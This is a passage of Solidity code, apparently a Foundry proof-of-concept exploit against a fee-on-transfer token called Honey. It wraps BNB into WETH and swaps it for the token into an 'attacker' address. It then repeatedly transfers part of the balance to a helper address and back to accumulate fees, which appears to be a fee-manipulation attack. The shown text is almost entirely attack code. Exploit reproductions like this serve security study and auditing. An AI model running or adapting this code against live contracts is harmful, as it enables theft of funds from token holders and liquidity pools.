        // Create path: WETH -> Honey
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Wrap BNB to WETH
        IWETH(weth).deposit{value: amount}();
        IWETH(weth).approve(routerAddress, amount);

        // Swap WETH for Honey
        IRouter(routerAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            attacker,
            block.timestamp
        );
    }

    function accumulateFees() private {
        address helper = address(0x123);
        uint256 honeyBalance = Honey(TARGET).balanceOf(attacker);

        // Transfer small amounts multiple times to accumulate fees
        for (uint i = 0; i < 10; i++) {
            uint256 transferAmount = honeyBalance / 20; // Transfer 5% each time
            Honey(TARGET).transfer(helper, transferAmount);
            // Transfer back to continue accumulating
            vm.prank(helper);
            Honey(TARGET).transfer(attacker, Honey(TARGET).balanceOf(helper));
        }
    }

